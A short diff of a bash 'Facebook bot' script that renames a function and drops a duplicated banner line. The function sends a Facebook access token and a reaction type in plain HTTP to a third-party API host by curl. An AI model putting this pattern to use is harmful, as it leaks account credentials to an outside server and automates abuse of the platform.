@@ -13,7 +13,6 @@ BOLD="\e[1m"
 NOCOLOR="\e[0m"
 header(){
 printf "${GREEN}
-printf "${GREEN}
          ##############################################
          ##             FACEBOOK BOT MUX.            ##${BL$
          ##          By : ALIF PUTRA DARMAWAN        ##${RE$
@@ -21,7 +20,7 @@ printf "${GREEN}
          ##############################################${GR$
 "
 }
-hackcod3x(){
+rahim(){
     typena="$1"
     tokenfb="$2"
     curlnya=$(curl -s "http://48.nakocoders.org/api/reaction/api.php?type=$1&tokenna=$2" -L)
